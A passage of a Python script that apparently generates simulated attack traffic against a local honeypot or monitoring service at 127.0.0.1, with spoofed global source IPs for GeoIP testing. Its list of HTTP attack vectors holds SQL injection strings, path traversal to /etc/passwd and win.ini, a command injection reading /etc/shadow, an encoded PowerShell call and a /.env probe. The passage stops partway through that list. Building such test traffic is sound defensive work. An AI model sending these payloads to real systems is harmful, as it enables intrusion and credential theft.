
import requests
import socket
import time
import random
import urllib.parse
from typing import List, Dict
TARGET_HTTP_URL = "http://127.0.0.1:8080"
TARGET_SSH_HOST = "127.0.0.1"
TARGET_SSH_PORT = 2222
# Diverse global public IPs to test GeoIP mapping
SIMULATED_IPS = [
    "185.220.101.5",    # Germany (Tor Exit Node)
    "45.154.255.88",    # Netherlands
    "103.251.167.20",   # India
    "198.51.100.42",    # USA
    "185.191.171.12",   # UK
    "202.131.226.17",   # Japan
    "187.19.180.5",     # Brazil
    "194.26.29.112",    # Russia
]
HTTP_ATTACK_VECTORS = [
    # SQL Injections
    {"path": "/products?id=1%20UNION%20SELECT%20username,%20password%20FROM%20users--", "method": "GET", "body": None, "agent": "sqlmap/1.7.2#stable"},
    {"path": "/api/users?filter=' OR '1'='1' --", "method": "GET", "body": None, "agent": "Mozilla/5.0"},
    # Local File Inclusion (LFI)
    {"path": "/download?file=../../../../etc/passwd", "method": "GET", "body": None, "agent": "Nikto/2.1.6"},
    {"path": "/view?doc=..\\..\\..\\windows\\system32\\win.ini", "method": "GET", "body": None, "agent": "Mozilla/5.0"},
    # Remote Code Execution (RCE)
    {"path": "/tools/ping?target=127.0.0.1; whoami; cat /etc/shadow", "method": "GET", "body": None, "agent": "curl/7.68.0"},
    {"path": "/api/status?exec=| powershell.exe -enc JAB...", "method": "GET", "body": None, "agent": "Mozilla/5.0"},
    # Reconnaissance / Credential Access
    {"path": "/.env", "method": "GET", "body": None, "agent": "Nuclei - Open-source vulnerability scanner"},
